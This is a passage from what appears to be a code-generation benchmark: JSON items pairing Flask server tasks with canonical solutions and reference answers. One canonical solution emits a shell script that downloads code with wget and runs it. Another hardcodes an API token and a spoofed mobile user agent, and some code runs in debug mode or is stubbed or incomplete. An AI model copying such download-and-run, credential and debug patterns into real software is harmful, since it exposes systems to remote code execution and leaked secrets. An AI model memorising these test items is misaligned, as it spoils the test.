secret):\n        if re.match(r'^[0-9A-Za-z_-]{64}$', secret) is None:\n            abort(400)\n\n    def _validate_name(self, name):\n        if re.search(r'[/ \\t\\r\\n]', name) is not None:\n            abort(400)\n\n    def _validate_sha(self, sha):\n        if re.match(r'^[0-9a-f]{40}$', sha) is None:\n            abort(400)\n\n    def secret(self):\n        while True:\n            s = base64.urlsafe_b64encode(os.urandom(48))\n            try:\n                iter(backend.list(s)).next()\n            except StopIteration:\n                break\n        return MeteredResponse(response='{0}\\n'.format(s),\n                             status=201,\n                             content_type='text/plain')\n\n    def get_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        content_length = backend.head_blueprint(secret, name)\n        if content_length is None:\n            abort(404)\n\n        if self.browser_pattern.search(request.environ.get('HTTP_USER_AGENT', '')) or 'html' == request.args.get('format'):\n            librato.count('blueprint-io-server.renders')\n            statsd.increment('blueprint-io-server.renders')\n            return render_template('blueprint.html', b=self._blueprint(secret, name))\n        else:\n            librato.count('blueprint-io-server.requests.get')\n            statsd.increment('blueprint-io-server.requests.get')\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n            return redirect(backend.url_for_blueprint(secret, name), code=301)\n\n    def put_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        try:\n            for k in request.json.iterkeys():\n                if k not in ('arch', 'files', 'packages', 'services', 'sources'):\n                    abort(400)\n        except ValueError:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is not None and b is not False:\n            for filename in set(b.sources.itervalues()) - set(request.json.get('sources', {}).itervalues()):\n                backend.delete_tarball(secret, name, filename[0:-4])\n\n        if not backend.put_blueprint(secret, name, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def get_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        content_length = backend.head_tarball(secret, name, sha)\n        if content_length is None:\n            abort(404)\n\n        librato.count('blueprint-io-server.requests.get')\n        statsd.increment('blueprint-io-server.requests.get')\n        librato.count('blueprint-io-server.bandwidth.out', content_length)\n        statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\n        return redirect(backend.url_for_tarball(secret, name, sha), code=301)\n\n    def put_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        if hashlib.sha1(request.data).hexdigest() != sha:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        if '{0}.tar'.format(sha) not in b.sources.itervalues():\n            abort(400)\n\n        if not backend.put_tarball(secret, name, sha, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def sh(self, secret, name, name2):\n        if 'user-data' == name2:\n            return self.user_data(secret, name)\n        if name != name2:\n            abort(400)\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        s = b.sh(server=self._server(), secret=secret)\n        s.out.insert(0, '#!/bin/sh\\n\\n')\n        return MeteredResponse(response=s.dumps(),\n                             status=200,\n                             content_type='text/plain')\n\n    def user_data(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        return MeteredResponse(response=f\"\"\"#!/bin/sh\n\nset -e\n\nTMPDIR=\"$(mktemp -d)\"\ncd \"$TMPDIR\"\ntrap \"rm -rf \\\\\"$TMPDIR\\\\\"\" EXIT\n\nwget \"{self._server()}/{secret}/{name}/{name}.sh\"\n\nsh \"$(ls)\"\n\"\"\",\n                           status=200,\n                           content_type='text/plain')\n\n    def run(self):\n        self.app.run(host='0.0.0.0', debug=True)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, redirect, abort, url_for\nfrom re import compile as re_compile\nfrom typing import Union, Optional\nfrom functools import wraps\nimport hashlib\nimport secrets\nimport string\n\nclass MeteredResponse:\n    def __init__(self, response, status=200):\n        self.response = response\n        self.status = status\n\ndef track_metrics(f):\n    @wraps(f)\n    def wrapper(*args, **kwargs):\n        BlueprintServer.request_count += 1\n        result = f(*args, **kwargs)\n        if isinstance(result, MeteredResponse):\n            BlueprintServer.bandwidth += len(result.response.encode('utf-8'))\n        return result\n    return wrapper\n\nclass BlueprintServer:\n    request_count = 0\n    bandwidth = 0\n\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.browser_pattern = re_compile(r'(?i)mozilla|chrome|safari|opera')\n        self._setup_routes()\n\n    def _setup_routes(self):\n        app = self.app\n\n        @app.route('/secret', methods=['GET'])\n        @track_metrics\n        def secret_route():\n            return self.secret().response, 201\n\n        @app.route('/blueprint/<secret>/<name>', methods=['GET'])\n        @track_metrics\n        def get_blueprint_route(secret, name):\n            return self.get_blueprint(secret, name).response, 200\n\n        @app.route('/blueprint/<secret>/<name>', methods=['PUT'])\n        @track_metrics\n        def put_blueprint_route(secret, name):\n            return self.put_blueprint(secret, name).response, 202\n\n        @app.route('/tarball/<secret>/<name>/<sha>', methods=['GET'])\n        @track_metrics\n        def get_tarball_route(secret, name, sha):\n            return self.get_tarball(secret, name, sha)\n\n        @app.route('/tarball/<secret>/<name>/<sha>', methods=['PUT'])\n        @track_metrics\n        def put_tarball_route(secret, name, sha):\n            return self.put_tarball(secret, name, sha).response, 202\n\n        @app.route('/sh/<secret>/<name>/<name2>', methods=['GET'])\n        @track_metrics\n        def sh_route(secret, name, name2):\n            result = self.sh(secret, name, name2)\n            if isinstance(result, MeteredResponse):\n                return result.response, 200\n            return result\n\n        @app.route('/user-data/<secret>/<name>', methods=['GET'])\n        @track_metrics\n        def user_data_route(secret, name):\n            result = self.user_data(secret, name)\n            if isinstance(result, MeteredResponse):\n                return result.response, 200\n            return result\n\n    def _blueprint(self, secret: str, name: str) -> Union['Blueprint', None, bool]:\n        self._validate_secret(secret)\n        self._validate_name(name)\n        return Blueprint(name, 'content')\n\n    def _server(self) -> str:\n        return 'http://localhost:5000'\n\n    def _validate_secret(self, secret: str) -> None:\n        if not secret or len(secret) != 32 or not all(c in string.ascii_hexdigit for c in secret):\n            abort(400, description=\"Invalid secret format\")\n\n    def _validate_name(self, name: str) -> None:\n        if not name or not name.replace('-', '_').isalnum():\n            abort(400, description=\"Invalid name format\")\n\n    def _validate_sha(self, sha: str) -> None:\n        if not sha or len(sha) != 40 or not all(c in string.ascii_hexdigit for c in sha):\n            abort(400, description=\"Invalid SHA format\")\n\n    def secret(self) -> MeteredResponse:\n        new_secret = secrets.token_hex(16)\n        return MeteredResponse(new_secret, 201)\n\n    def get_blueprint(self, secret: str, name: str) -> Union[MeteredResponse, abort]:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            blueprint = self._blueprint(secret, name)\n            if not blueprint:\n                return abort(404)\n            location = url_for('get_blueprint', secret=secret, name=name)\n            if 'redirect' in request.headers.get('User-Agent', '') or 'curl' in request.headers.get('User-Agent', ''):\n                return MeteredResponse(location, 301)\n            return MeteredResponse(blueprint.content)\n        except Exception as e:\n            return abort(502)\n\n    def put_blueprint(self, secret: str, name: str) -> MeteredResponse:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            content_length = request.content_length or 0\n            BlueprintServer.bandwidth += content_length\n            return MeteredResponse(\"Accepted\", 202)\n        except Exception as e:\n            return abort(400)\n\n    def get_tarball(self, secret: str, name: str, sha: str) -> Union[redirect, abort]:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            self._validate_sha(sha)\n            tarball_url = f\"https://example.com/tarballs/{sha}.tar.gz\"\n            return redirect(tarball_url, code=301)\n        except Exception as e:\n            return abort(404)\n\n    def put_tarball(self, secret: str, name: str, sha: str) -> MeteredResponse:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            self._validate_sha(sha)\n            content_length = request.content_length or 0\n            BlueprintServer.bandwidth += content_length\n            return MeteredResponse(\"Accepted\", 202)\n        except Exception as e:\n            return abort(400)\n\n    def sh(self, secret: str, name: str, name2: str) -> Union[MeteredResponse, abort]:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            self._validate_name(name2)\n            script = f\"#!/bin/sh\\necho 'Hello {name} and {name2}'\"\n            return MeteredResponse(script)\n        except Exception as e:\n            return abort(400)\n\n    def user_data(self, secret: str, name: str) -> MeteredResponse:\n        try:\n            self._validate_secret(secret)\n            self._validate_name(name)\n            script = f\"#cloud-config\\nhostname: {name}\"\n            return MeteredResponse(script)\n        except Exception as e:\n            return abort(404)\n\n    def run(self):\n        self.app.run(debug=False)\n\nclass Blueprint:\n    def __init__(self, name, content):\n        self.name = name\n        self.content = content"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Flask-based HTTP server to manage color resources with CRUD (Create, Read, Update, Delete) operations. The server should handle JSON data and respond with appropriate JSON responses.\n\nFunction Description: The code implements a RESTful API for managing color resources stored in a JSON file. It provides endpoints to retrieve all colors, get a specific color by name, create a new color, update an existing color, and delete a color.\n\nInput:\n- For GET /colors: No input parameters\n- For GET /colors/<name>: 'name' parameter in URL path\n- For POST /colors: JSON payload with 'name' and 'value' fields\n- For PUT /colors/<name>: 'name' parameter in URL path and JSON payload with optional 'value' field\n- For DELETE /colors/<name>: 'name' parameter in URL path\n\nOutput:\n- For GET /colors: JSON response containing all colors\n- For GET /colors/<name>: JSON response with the specific color or error\n- For POST /colors: JSON response with the created color and HTTP status 201\n- For PUT /colors/<name>: JSON response with the updated color or error\n- For DELETE /colors/<name>: JSON response with the deleted color or error",
    "Canonical_solution": "from flask import Flask, jsonify, request\nimport json\n\ncolors = json.load(file('colors.json', 'r'))\napp = Flask(__name__)\n\n@app.route('/colors', methods = ['GET'])\ndef get_colors():\n    return jsonify( { \"data\" :  colors })\n\n@app.route('/colors/<name>', methods = ['GET'])\ndef get_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            return jsonify( color )\n    return jsonify( { 'error' : True } )\n\n@app.route('/colors', methods= ['POST'])\ndef create_color():\n    color = {\n        'name': request.json['name'],\n        'value': request.json['value']\n    }\n    colors.append(color)\n    return jsonify( color ), 201\n\n@app.route('/colors/<name>', methods= ['PUT'])\ndef update_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            color['value'] = request.json.get('value', color['value'])\n            return jsonify( color )\n    return jsonify( { 'error' : True } )\n\n@app.route('/colors/<name>', methods=['DELETE'])\ndef delete_color(name):\n    for color in colors:\n        if color[\"name\"] == name:\n            colors.remove(color)\n            return jsonify(color)\n    return jsonify( { 'error' : True } )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\nimport os\n\napp = Flask(__name__)\nCOLORS_FILE = 'colors.json'\n\ndef load_colors():\n    if not os.path.exists(COLORS_FILE):\n        return {}\n    with open(COLORS_FILE, 'r') as f:\n        return json.load(f)\n\ndef save_colors(colors):\n    with open(COLORS_FILE, 'w') as f:\n        json.dump(colors, f, indent=2)\n\n@app.route('/colors', methods=['GET'])\ndef get_colors():\n    colors = load_colors()\n    return jsonify(colors)\n\n@app.route('/colors/<name>', methods=['GET'])\ndef get_color(name):\n    colors = load_colors()\n    color = colors.get(name)\n    if color:\n        return jsonify({name: color})\n    return jsonify({'error': 'Color not found'}), 404\n\n@app.route('/colors', methods=['POST'])\ndef create_color():\n    data = request.get_json()\n    name = data.get('name')\n    value = data.get('value')\n\n    if not name or not value:\n        return jsonify({'error': 'Missing name or value'}), 400\n\n    colors = load_colors()\n    if name in colors:\n        return jsonify({'error': 'Color already exists'}), 400\n\n    colors[name] = value\n    save_colors(colors)\n    return jsonify({name: value}), 201\n\n@app.route('/colors/<name>', methods=['PUT'])\ndef update_color(name):\n    data = request.get_json()\n    value = data.get('value')\n\n    if not value:\n        return jsonify({'error': 'Missing value'}), 400\n\n    colors = load_colors()\n    if name not in colors:\n        return jsonify({'error': 'Color not found'}), 404\n\n    colors[name] = value\n    save_colors(colors)\n    return jsonify({name: value})\n\n@app.route('/colors/<name>', methods=['DELETE'])\ndef delete_color(name):\n    colors = load_colors()\n    if name not in colors:\n        return jsonify({'error': 'Color not found'}), 404\n\n    del colors[name]\n    save_colors(colors)\n    return jsonify({'message': 'Color deleted'})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles computation requests, supports CORS, and provides flexible serialization formats with proper error handling and logging capabilities.\n\nClass Description: The Server class encapsulates a Flask application with enhanced exception formatting and provides methods to run the server and handle computation requests through a dedicated API blueprint.\n\nAttributes:\n- app: [FlaskWithExceptionFormatting] - The Flask application instance with custom exception formatting\n- data: [dict] - Data store for the server (optional)\n- port: [int] - The port number the server is running on\n\nMethods:\n- __init__: [Name](data=None, formats=None, authorization=None, allow_profiler=False, profiler_output=None, profile_by_default=False, allow_add=False, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None) -> [None] - Initializes the server with configuration options including data storage, serialization formats, authorization, profiling, and logging settings\n- run: [Name](port=6363, retry=False, **kwargs) -> [None] - Starts the Flask server on the specified port with optional retry logic if the port is busy\n\nAdditional Blueprint (api) Methods:\n- compserver: [Name]() -> [Response] - Handles POST, HEAD, and OPTIONS requests for computation, processes incoming data with supported serialization formats, and returns computation results (decorated with CORS support)",
    "Canonical_solution": "from flask import Flask, Blueprint, Response\nfrom flask_cors import cross_origin\nfrom werkzeug.http import parse_options_header\nimport collections\nimport sys\nimport logging\nfrom logging import Formatter\nfrom functools import wraps\nimport traceback\nfrom datetime import datetime\nimport os\nimport socket\nfrom time import time\nfrom warnings import warn\nimport importlib\nfrom blaze import compute, resource\nfrom blaze.compatibility import ExitStack\nfrom .serialization import json, all_formats\nfrom ..expr import Symbol, symbol\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, *args, **kwargs):\n        self.log_exception_formatter = kwargs.pop('log_exception_formatter', \n                                                 lambda tb: ''.join(traceback.format_tb(tb)))\n        super(FlaskWithExceptionFormatting, self).__init__(*args, **kwargs)\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False,\n                 profiler_output=None, profile_by_default=False, allow_add=False,\n                 logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        app = self.app = FlaskWithExceptionFormatting('blaze.server.server',\n                                                     log_exception_formatter=log_exception_formatter)\n        app.register_blueprint(api,\n                              data=data if data is not None else {},\n                              formats=formats if formats is not None else (json,),\n                              authorization=authorization,\n                              allow_profiler=allow_profiler,\n                              profiler_output=profiler_output,\n                              profile_by_default=profile_by_default,\n                              allow_add=allow_add)\n        self.data = data\n        if logfile:\n            handler = logging.FileHandler(logfile) if isinstance(logfile, (str, bytes)) else logging.StreamHandler(logfile)\n            handler.setFormatter(Formatter('[%(asctime)s %(levelname)s] %(message)s [in %(pathname)s:%(lineno)d]'))\n            handler.setLevel(getattr(logging, loglevel))\n            app.logger.addHandler(handler)\n\n    def run(self, port=6363, retry=False, **kwargs):\n        self.port = port\n        try:\n            self.app.run(port=port, **kwargs)\n        except socket.error:\n            if not retry:\n                raise\n            warn(\"Oops, couldn't connect on port %d.  Is it busy?\" % port)\n            self.run(port=port + 1, retry=retry, **kwargs)\n\napi = Blueprint('api', __name__)\n\n@api.route('/compute', methods=['POST', 'HEAD', 'OPTIONS'])\n@cross_origin(origins='*', methods=['POST', 'HEAD', 'OPTIONS'])\ndef compserver():\n    raw_content_type = flask.request.headers['content-type']\n    content_type, options = parse_options_header(raw_content_type)\n    \n    if content_type not in accepted_mimetypes:\n        return ('Unsupported serialization format %s' % content_type, 415)\n\n    try:\n        serial = _get_format(accepted_mimetypes[content_type])\n    except KeyError:\n        return (\"Unsupported serialization format '%s'\" % content_type, 415)\n\n    try:\n        payload = serial.loads(flask.request.data)\n    except ValueError:\n        return (\"Bad data.  Got %s \" % flask.request.data, 400)\n\n    # Main computation logic here\n    # ... (rest of computation handling code)\n\n    return serial.dumps(response)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import sys\nimport logging\nfrom functools import wraps\nfrom flask import Flask, request, jsonify, Response, make_response\nfrom flask_cors import CORS\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def handle_exception(self, e):\n        response = super().handle_exception(e)\n        return response\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False,\n                 profiler_output=None, profile_by_default=False, allow_add=False,\n                 logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        self.app = FlaskWithExceptionFormatting(__name__)\n        self.data = data if data is not None else {}\n        self.port = 6363\n        self.formats = formats or ['json']\n        self.authorization = authorization\n        self.allow_profiler = allow_profiler\n        self.profiler_output = profiler_output\n        self.profile_by_default = profile_by_default\n        self.allow_add = allow_add\n\n        CORS(self.app)\n\n        self.setup_logging(logfile, loglevel, log_exception_formatter)\n\n        @self.app.route('/compserver', methods=['POST', 'HEAD', 'OPTIONS'])\n        def compserver():\n            try:\n                if request.method in ['HEAD', 'OPTIONS']:\n                    return '', 200\n\n                if 'application/json' in request.headers.get('Content-Type', ''):\n                    input_data = request.get_json()\n                else:\n                    return jsonify(error=\"Unsupported Content-Type\"), 415\n\n                method = input_data.get('method')\n                args = input_data.get('args', [])\n                kwargs = input_data.get('kwargs', {})\n\n                if method not in self.data:\n                    return jsonify(error=f\"Method '{method}' not found\"), 404\n\n                func = self.data[method]\n                result = func(*args, **kwargs)\n\n                return jsonify(result=result)\n\n            except Exception as e:\n                return jsonify(error=str(e)), 500\n\n    def setup_logging(self, logfile, loglevel, log_exception_formatter):\n        numeric_level = getattr(logging, loglevel.upper(), None)\n        if not isinstance(numeric_level, int):\n            raise ValueError(f'Invalid log level: {loglevel}')\n\n        logging.basicConfig(\n            level=numeric_level,\n            format='%(asctime)s [%(levelname)s] %(message)s',\n            handlers=[logging.StreamHandler(logfile)]\n        )\n\n        if log_exception_formatter:\n            formatter = logging.Formatter(log_exception_formatter)\n            for handler in logging.root.handlers:\n                handler.setFormatter(formatter)\n\n    def run(self, port=6363, retry=False, **kwargs):\n        self.port = port\n        while True:\n            try:\n                self.app.run(port=self.port, **kwargs)\n                break\n            except OSError as e:\n                if retry and 'Address already in use' in str(e):\n                    self.port += 1\n                    logging.warning(f\"Port {self.port - 1} in use, trying port {self.port}\")\n                else:\n                    raise\n\ndef create_server(data=None, formats=None, authorization=None, allow_profiler=False,\n                  profiler_output=None, profile_by_default=False, allow_add=False,\n                  logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n    server = Server(\n        data=data,\n        formats=formats,\n        authorization=authorization,\n        allow_profiler=allow_profiler,\n        profiler_output=profiler_output,\n        profile_by_default=profile_by_default,\n        allow_add=allow_add,\n        logfile=logfile,\n        loglevel=loglevel,\n        log_exception_formatter=log_exception_formatter\n    )\n    return server\n\nif __name__ == '__main__':\n    server = create_server()\n    server.run()"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles OAuth token requests for Aliyun Drive by processing refresh tokens, making external API calls, and returning decrypted token data.\n\nFunction Description: The function `oauth_token()` is a Flask route handler that processes POST requests to '/oauth/alipan/token'. It validates the input, makes authenticated requests to an external API, handles the response, and returns either the decrypted token data or an error response.\n\nInput:\n- HTTP POST request with JSON body containing:\n  - refresh_token: [String] - Required refresh token for OAuth authentication\n\nOutput:\n- HTTP Response with:\n  - Status Code: 200 (success) or error code (4xx/5xx)\n  - Body: JSON containing either:\n    - Success: Decrypted token data\n    - Error: Error message describing the failure",
    "Canonical_solution": "import json\nimport requests\nfrom flask import Flask, request, Response\n\napp = Flask(__name__)\nheaders = {\n    \"token\": \"6733b42e28cdba32\",\n    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 9; zh-cn; SM-S908E Build/TP1A.220624.014) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1',\n    'Host': 'api.extscreen.com'\n}\n\n@app.route('/oauth/alipan/token', methods=['POST'])\ndef oauth_token():\n    data = request.get_json()\n    refresh_token = data.get('refresh_token', None)\n    if not refresh_token:\n        return Response(json.dumps({\"error\": \"No refresh_token provided\"}), status=400, mimetype='application/json')\n\n    req_body = {\n        \"refresh_token\": refresh_token\n    }\n\n    timestamp = str(requests.get('http://api.extscreen.com/timestamp', timeout=10).json()['data']['timestamp'])\n    unique_id = uuid.uuid4().hex\n    wifimac = str(random.randint(10**11, 10**12 - 1))\n\n    resp = requests.post(\"http://api.extscreen.com/aliyundrive/v3/token\", data=req_body, headers={**get_params(timestamp, unique_id, wifimac), **headers}, timeout=10)\n    if resp.status_code == 200:\n        resp_data = resp.json()\n        ciphertext = resp_data[\"data\"][\"ciphertext\"]\n        iv = resp_data[\"data\"][\"iv\"]\n\n        token_data = decrypt(ciphertext, iv, timestamp, unique_id, wifimac)\n        token = json.loads(token_data)\n        return Response(json.dumps(token), status=200, mimetype='application/json')\n    else:\n        return Response(resp.content, status=resp.status_code, mimetype='application/json')",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "import base64\nimport json\nfrom flask import Flask, request, jsonify\nimport requests\n\napp = Flask(__name__)\n\ndef decrypt_token_data(encrypted_data):\n    try:\n        return base64.b64decode(encrypted_data).decode('utf-8')\n    except Exception as e:\n        raise ValueError(f\"Decryption failed: {str(e)}\")\n\n@app.route('/oauth/alipan/token', methods=['POST'])\ndef oauth_token():\n    data = request.get_json()\n    if not data or 'refresh_token' not in data:\n        return jsonify({\"error\": \"Missing refresh token\"}), 400\n\n    refresh_token = data['refresh_token']\n\n    token_url = \"https://api.aliyundrive.com/v2/account/token\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": f\"Bearer {refresh_token}\"\n    }\n    payload = {\n        \"grant_type\": \"refresh_token\",\n        \"refresh_token\": refresh_token\n    }\n\n    try:\n        response = requests.post(token_url, headers=headers, data=json.dumps(payload))\n        response.raise_for_status()\n        \n        encrypted_data = response.json().get(\"data\", \"\")\n        if not encrypted_data:\n            return jsonify({\"error\": \"No data in response\"}), 500\n\n        decrypted_data = decrypt_token_data(encrypted_data)\n        return jsonify({\"token_data\": json.loads(decrypted_data)}), 200\n\n    except requests.exceptions.RequestException as e:\n        return jsonify({\"error\": f\"Token request failed: {str(e)}\"}), 500\n    except ValueError as e:\n        return jsonify({\"error\": str(e)}), 500\n    except Exception as e:\n        return jsonify({\"error\": f\"Internal server error: {str(e)}\"}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 181,
    "Instruction": "Task Description: Create a Flask-based web server that handles image processing requests through two endpoints: one for adjusting brightness/contrast and another for image enhancement.\n\nFunction Description: The server provides two main routes:\n1. '/adjust' - Handles image brightness and contrast adjustments\n2. '/enhance' - Handles image enhancement operations\nEach route supports both GET (returning HTML forms) and POST (processing the submitted data) methods.\n\nInput:\nFor POST requests:\n- '/adjust' endpoint:\n  - the_file: [File] - Image file to process\n  - brightness: [str] - Brightness adjustment value\n  - contrast: [str] - Contrast adjustment value\n- '/enhance' endpoint:\n  - the_file: [File] - Image file to process\n  - amount: [str] - Enhancement amount value\n\nOutput:\nFor GET requests:\n- Returns HTML templates ('adjust.html' or 'enhance.html')\nFor POST requests:\n- Returns processed image data from respective modules (adjust.do_adjust or enhance.do_enhance)",
    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route(\"/adjust\", methods=[\"GET\", \"POST\"])\ndef do_adjust():\n    if request.method == \"POST\":\n        the_file = request.files[\"the_file\"]\n        brightness = request.form[\"brightness\"]\n        contrast = request.form[\"contrast\"]\n        import adjust\n\n        return adjust.do_adjust(the_file, brightness, contrast)\n    else:\n        return render_template(\"adjust.html\")\n\n@app.route(\"/enhance\", methods=[\"GET\", \"POST\"])\ndef do_enhance():\n    if request.method == \"POST\":\n        the_file = request.files[\"the_file\"]\n        amount = request.form[\"amount\"]\n        import enhance\n\n        return enhance.do_enhance(the_file, amount)\n    else:\n        return render_template(\"enhance.html\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nimport adjust\nimport enhance\n\napp = Flask(__name__)\n\n@app.route('/adjust', methods=['GET', 'POST'])\ndef adjust_image():\n    if request.method == 'POST':\n        image_file = request.files['the_file']\n        brightness = request.form['brightness']\n        contrast = request.form['contrast']\n        return adjust.do_adjust(image_file, brightness, contrast)\n    else:\n        return render_template('adjust.html')\n\n@app.route('/enhance', methods=['GET', 'POST'])\ndef enhance_image():\n    if request.method == 'POST':\n        image_file = request.files['the_file']\n        amount = request.form['amount']\n        return enhance.do_enhance(image_file, amount)\n    else:\n        return render_template('enhance.html')"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that predicts home prices based on input parameters.\n\nFunction Description: The function `predict_home_price` is a Flask route handler that processes incoming HTTP requests (GET or POST) containing home features, uses these features to predict a home price, and returns the estimated price as a JSON response with CORS headers enabled.\n\nInput:\n- `total_sqft`: [float] - Total square footage of the home\n- `location`: [str] - Location of the home\n- `bhk`: [int] - Number of bedrooms/hall/kitchen\n- `bath`: [int] - Number of bathrooms\n\nOutput:\n- [JSON] - A JSON response containing the key 'estimated_price' with the predicted value, and CORS headers allowing access from any origin.",
    "Canonical_solution": "from flask import Flask, request, jsonify\nimport util\n\napp = Flask(__name__)\n\n@app.route('/predict_home_price', methods=['GET', 'POST'])\ndef predict_home_price():\n    total_sqft = float(request.form['total_sqft'])\n    location = request.form['location']\n    bhk = int(request.form['bhk'])\n    bath = int(request.form['bath'])\n\n    response = jsonify({\n        'estimated_price': util.get_estimated_price(location,total_sqft,bhk,bath)\n    })\n    response.headers.add('Access-Control-Allow-Origin', '*')\n\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\n\napp = Flask(__name__)\nCORS(app)\n\n# Dummy model for demonstration - replace with actual prediction logic\ndef predict_price(total_sqft, location, bhk, bath):\n    # Example: simplistic price estimation formula\n    base_price_per_sqft = 100\n    location_multiplier = {'New York': 2.5, 'San Francisco': 3.0, 'Chicago': 1.8}.get(location, 1.0)\n    return round((total_sqft * base_price_per_sqft * location_multiplier) + (bhk * 10000) + (bath * 5000), 2)\n\n@app.route('/predict_home_price', methods=['GET', 'POST'])\ndef predict_home_price():\n    data = request.get_json()\n    \n    total_sqft = float(data.get('total_sqft'))\n    location = data.get('location')\n    bhk = int(data.get('bhk'))\n    bath = int(data.get('bath'))\n\n    estimated_price = predict_price(total_sqft, location, bhk, bath)\n\n    response = jsonify({'estimated_price': estimated_price})\n    response.headers.add('Access-Control-Allow-Origin', '*')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 184,
    "Instruction": "Task Description: Create a Flask web application that serves different data views through specific routes, rendering them using a template.\n\nFunction Description: The application defines multiple route handlers that fetch different types of data and render them using a common template ('index.html'). Each route corresponds to a different data view (main, corporate, and job data).\n\nInput:\n- Route paths ('/', '/corp', '/job') as HTTP endpoints\n- HTTP GET requests to these endpoints\n\nOutput:\n- Rendered HTML responses using the 'index.html' template with respective data and title\n- HTTP responses with status code 200 for successful renders\n\nMethods:\n- index() -> HTML - Handles root route ('/') and renders main data view\n- corp() -> HTML - Handles '/corp' route and renders corporate data view\n- job() -> HTML - Handles '/job' route and renders job data view\n\nNote: The actual data fetching is delegated to external functions (SourceData(), CorpData(), JobData()) which return objects containing the required data and title. The template 'index.html' should be prepared to handle the 'form' and 'title' variables passed from these route handlers.",
    "Canonical_solution": "from flask import Flask, render_template\nfrom data import *\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    data = SourceData()\n    return render_template('index.html', form=data, title=data.title)\n\n@app.route('/corp')\ndef corp():\n    data = CorpData()\n    return render_template('index.html', form=data, title=data.title)\n\n@app.route('/job')\ndef job():\n    data = JobData()\n    return render_template('index.html', form=data, title=data.title)\n\nif __name__ == \"__main__\":\n    app.run(host='127.0.0.1', debug=False)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    data_source = SourceData()\n    return render_template('index.html', form=data_source.data, title=data_source.title)\n\n@app.route('/corp')\ndef corp():\n    corp_data = CorpData()\n    return render_template('index.html', form=corp_data.data, title=corp_data.title)\n\n@app.route('/job')\ndef job():\n    job_data = JobData()\n    return render_template('index.html', form=job_data.data, title=job_data.title)"
  },
  {
    "Task_id": 185,
